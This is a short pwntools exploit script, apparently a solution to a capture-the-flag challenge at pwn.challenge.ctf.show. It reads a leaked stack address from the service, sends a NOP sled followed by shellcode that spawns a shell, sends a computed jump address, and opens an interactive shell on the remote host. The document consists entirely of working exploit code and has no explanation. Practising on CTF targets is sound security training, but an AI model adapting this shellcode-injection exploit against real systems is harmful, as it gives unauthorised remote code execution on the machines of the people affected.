from pwn import *
context(arch='amd64',os='linux',log_level = 'debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28121)
shellcode = asm(shellcraft.sh())
payload = b'\x90'*1336 + shellcode
io.recvuntil("The current location: 0x")
addr = u64(unhex(io.recvline(keepends=False).zfill(16)),endian='big')
print ("Addr: " + hex(addr))
io.recvuntil("> ")
io.sendline(payload)
io.recvuntil("> ")
sh = addr + 668 + 0x35;
print("Sending: " + hex(sh))
io.sendline(hex(sh))
io.interactive()
